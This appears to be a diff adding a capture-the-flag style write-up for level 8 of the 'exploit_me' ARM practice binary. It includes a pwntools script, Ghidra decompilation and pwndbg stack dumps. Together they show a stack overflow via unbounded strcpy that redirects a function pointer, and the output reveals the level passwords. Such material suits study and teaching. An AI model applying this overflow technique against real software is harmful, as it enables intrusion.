@@ -1057,3 +1057,272 @@ Placing a 0x67 and 0x63 at input bytes 41 and 42, we passed the level:
 Heap magic number: 0x6763
 Level 8 Password: "Exploiter"
 ```
+
+# exploit_me ARM binary - level 8:
+```
+#!/home/dvader/tools/pwntools/bin/python3
+
+from pwn import *
+
+context(arch='arm', bits=32, endian='little')
+''' ### enter tmux before running ### '''
+context.terminal = ["tmux", "splitw", "-h"]
+
+
+cmd = 'whoami'
+
+binary_args = ['/home/dvader/exploit_me/bin/exploit', 'Exploiter', cmd]
+
+gdb_commands = '''
+set debuginfod enabled off
+set exec-wrapper env -i
+#b *0x110e8
+continue
+'''
+
+context.gdb_binary = "/usr/local/bin/pwndbg"
+io = gdb.debug(binary_args, gdbscript=gdb_commands)
+
+print(io.recvuntil(b'Current b ptr, addr: '))
+addr = int(io.recv(7).strip(), 16)
+
+print(addr)
+print(hex(addr))
+
+print(io.recvall(timeout=2))
+io.clean()
+io.close()
+
+### SECOND EXECUTION - allows for less hardcoded values/addresses ###
+cmd2 = cyclic(72) # buf of 72 - the next address we want to fill with the pointer to the level 9 function
+cmd2 += p32(addr)
+io = process(['/home/dvader/exploit_me/bin/exploit', 'Exploiter', cmd2])
+
+
+if args.INTERACTIVE:
+    io.interactive()
+else:
+    print(io.recvall(timeout=2))
+
+
+''' Learned (LX) '''
+
+# L0 - 
+# L1 - 
+# L2 - 
+
+
+''' Remembered (RX) '''
+
+# R0 - 
+
+
+''' To Do (TX) '''
+
+# T0 - 
+
+
+'''
+in ghidra - level 8 function:
+```
+undefined4 FUN_00010fe8_level_8(undefined4 param_1)
+
+{
+  undefined4 *puVar1;
+  undefined4 local_60;
+  undefined4 uStack_5c;
+  undefined4 uStack_58;
+  undefined4 uStack_54;
+  undefined4 local_50;
+  undefined4 uStack_4c;
+  undefined4 local_48;
+  undefined4 uStack_44;
+  undefined4 local_40;
+  undefined4 uStack_3c;
+  undefined4 local_38;
+  undefined4 uStack_34;
+  undefined4 local_30;
+  undefined4 uStack_2c;
+  undefined4 local_28;
+  undefined4 uStack_24;
+  undefined4 *local_20;
+  undefined4 local_1c;
+  undefined4 *local_18;
+  undefined4 *local_14;
+  
+  puVar1 = (undefined4 *)FUN_0001367c(4);
+  *puVar1 = 0;
+  FUN_00013508_ptr_to_print_level_9_password_here(puVar1);
+  local_20 = puVar1;
+                    /* local_20 stores the function pointer to get the password for level 9? */
+  puVar1 = (undefined4 *)FUN_0001367c(4);
+  *puVar1 = 0;
+  FUN_0001353c(puVar1);
+  local_18 = puVar1;
+  local_14 = puVar1;
+  FUN_0001e5e8_printf("Current g ptr, addr: %p\n",puVar1);
+  FUN_0001e5e8_printf("Current b ptr, addr: %p,%lx\n",local_20,&local_20);
+  uStack_5c = *(undefined4 *)((undefined1  [16])0x0 + (undefined1  [16])0x4);
+  uStack_58 = *(undefined4 *)((undefined1  [16])0x0 + (undefined1  [16])0x8);
+  uStack_54 = *(undefined4 *)((undefined1  [16])0x0 + (undefined1  [16])0xc);
+  local_60 = 0;
+  local_50 = 0;
+  local_48 = 0;
+  local_40 = 0;
+  local_38 = 0;
+  local_30 = 0;
+  local_28 = 0;
+  local_1c = 0;
+  uStack_4c = uStack_5c;
+  uStack_44 = uStack_5c;
+  uStack_3c = uStack_5c;
+  uStack_34 = uStack_5c;
+  uStack_2c = uStack_5c;
+  uStack_24 = uStack_5c;
+  FUN_00032b50_strcpy(&local_60,param_1);                 # unbounded strcpy()
+  (**(code **)*local_18)(local_18,&local_60);
+  if (local_14 != (undefined4 *)0x0) {
+    FUN_000310dc_free(local_14);
+  }
+  if (local_20 != (undefined4 *)0x0) {
+    FUN_000310dc_free(local_20);
+  }
+  return 0;
+}
+```
+
+####################################################
+
+ghidra - pointer to level 9 password:
+```
+undefined4 * FUN_00013508_ptr_to_print_level_9_password_here(undefined4 *param_1)
+
+{
+  *param_1 = &PTR_FUN_000134a8_level_9_print_password_here_0005fac8;
+  return param_1;
+}
+```
+
+####################################################
+
+ghidra - level 9 password print function:
+
+```
+void FUN_000134a8_level_9_print_password_here
+               (undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)
+
+{
+  FUN_0001e5e8_printf("Level 9 Password: \"%s\", welcome %s\n",s_Gimme_0007c2f8,param_2,param_4,
+                      param_2,param_1);
+  return;
+}
+```
+
+
+'''
+
+
+'''
+Strategy - manual testing:
+
+```
+└─$ ./exploit Exploiter                                        
+usage: ./exploit Exploiter <cmd>
+```
+```
+└─$ ./exploit Exploiter hi
+Current g ptr, addr: 0x861d8
+Current b ptr, addr: 0x861c8,407ffd70
+sh: 1: hi: not found
+```
+```
+└─$ ./exploit Exploiter ls
+Current g ptr, addr: 0x861d8
+Current b ptr, addr: 0x861c8,407ffd70
+arm  arm64  core.919813  dir1  exploit  exploit64  exploit_strings.txt  level2  level3  level4  level7  level8
+```
+```
+└─$ ./exploit Exploiter $(python -c "print('A'*64)")
+Current g ptr, addr: 0x861d8
+Current b ptr, addr: 0x861c8,407ffd30
+sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found
+free(): invalid size
+qemu: uncaught target signal 6 (Aborted) - core dumped
+zsh: IOT instruction  ./exploit Exploiter $(python -c "print('A'*64)")
+```
+
+
+'''
+
+
+'''
+in pwndbg - stack w/ input of size 48 to show stack layout before overwrite:
+
+pwndbg> stack 48
+│00:0000│ sp     0x407ffa88 ◂— 0
+│01:0004│        0x407ffa8c —▸ 0x407fff75 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaa
+│ajaaakaaalaaa'
+│02:0008│ r0 r12 0x407ffa90 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa'
+│03:000c│        0x407ffa94 ◂— 'baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa'
+│04:0010│        0x407ffa98 ◂— 'caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa'
+│05:0014│        0x407ffa9c ◂— 'daaaeaaafaaagaaahaaaiaaajaaakaaalaaa'
+│06:0018│        0x407ffaa0 ◂— 'eaaafaaagaaahaaaiaaajaaakaaalaaa'
+│07:001c│        0x407ffaa4 ◂— 'faaagaaahaaaiaaajaaakaaalaaa'
+│08:0020│        0x407ffaa8 ◂— 'gaaahaaaiaaajaaakaaalaaa'
+│09:0024│        0x407ffaac ◂— 'haaaiaaajaaakaaalaaa'
+│0a:0028│        0x407ffab0 ◂— 'iaaajaaakaaalaaa'
+│0b:002c│        0x407ffab4 ◂— 'jaaakaaalaaa'
+│0c:0030│        0x407ffab8 ◂— 'kaaalaaa'
+│0d:0034│        0x407ffabc ◂— 'laaa'
+│0e:0038│        0x407ffac0 ◂— 0
+│... ↓           3 skipped
+│12:0048│        0x407ffad0 —▸ 0x861c8 —▸ 0x5fac8 —▸ 0x134a8 ◂— push {r11, lr}    # 0x134a8 is address of level 9 password print function
+│13:004c│        0x407ffad4 ◂— 0
+│14:0050│        0x407ffad8 —▸ 0x861d8 —▸ 0x5fabc —▸ 0x134e0 ◂— push {r11, lr}    # need to overwrite this pointer to level 9 password print
+
+####################################################
+
+in pwndbg - after overwrite of size 72 + pointer to level 9 password:
+
+pwndbg> stack 48
+│00:0000│ sp     0x407ffa68 ◂— 0
+│01:0004│        0x407ffa6c —▸ 0x407fff5a ◂— 0x61616161 ('aaaa')
+│02:0008│ r0 r12 0x407ffa70 ◂— 0x61616161 ('aaaa')
+│03:000c│        0x407ffa74 ◂— 0x61616162 ('baaa')
+│04:0010│        0x407ffa78 ◂— 0x61616163 ('caaa')
+│05:0014│        0x407ffa7c ◂— 0x61616164 ('daaa')
+│06:0018│        0x407ffa80 ◂— 0x61616165 ('eaaa')
+│07:001c│        0x407ffa84 ◂— 0x61616166 ('faaa')
+│08:0020│        0x407ffa88 ◂— 0x61616167 ('gaaa')
+│09:0024│        0x407ffa8c ◂— 0x61616168 ('haaa')
+│0a:0028│        0x407ffa90 ◂— 0x61616169 ('iaaa')
+│0b:002c│        0x407ffa94 ◂— 0x6161616a ('jaaa')
+│0c:0030│        0x407ffa98 ◂— 0x6161616b ('kaaa')
+│0d:0034│        0x407ffa9c ◂— 0x6161616c ('laaa')
+│0e:0038│        0x407ffaa0 ◂— 0x6161616d ('maaa')
+│0f:003c│        0x407ffaa4 ◂— 0x6161616e ('naaa')
+│10:0040│        0x407ffaa8 ◂— 0x6161616f ('oaaa')
+│11:0044│        0x407ffaac ◂— 0x61616170 ('paaa')
+│12:0048│        0x407ffab0 ◂— 0x61616171 ('qaaa')
+│13:004c│        0x407ffab4 ◂— 0x61616172 ('raaa')
+│14:0050│        0x407ffab8 —▸ 0x861c8 —▸ 0x5fac8 —▸ 0x134a8 ◂— push {r11, lr}    # 0x50 from stack overwritten w/ pointer to level 9!
+'''
+
+
+'''
+successful - next password:
+└─$ ./l8.py
+[+] Starting local process '/usr/bin/qemu-arm': pid 1686428
+[*] running in new terminal: ['/usr/local/bin/pwndbg', '-q', '-x', '/tmp/pwnlib-gdbscript-4l9pzm7y.gdb']
+b'Current b ptr, addr: '
+549320
+0x861c8
+[+] Receiving all data: Done (17B)
+[*] Process '/usr/bin/qemu-arm' stopped with exit code 0 (pid 1686428)
+b',407ffaf0\ndvader\n'
+[+] Starting local process '/home/dvader/exploit_me/bin/exploit': pid 1686468
+[+] Receiving all data: Done (257B)
+[*] Process '/home/dvader/exploit_me/bin/exploit' stopped with exit code -6 (SIGABRT) (pid 1686468)
+b'Current g ptr, addr: 0x861d8\nCurrent b ptr, addr: 0x861c8,407ffab0\nLevel 9 Password: "Gimme", welcome aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa\xc8a\x08\nfree(): invalid pointer\nqemu: uncaught target signal 6 (Aborted) - core dumped\n'
+'''
+```
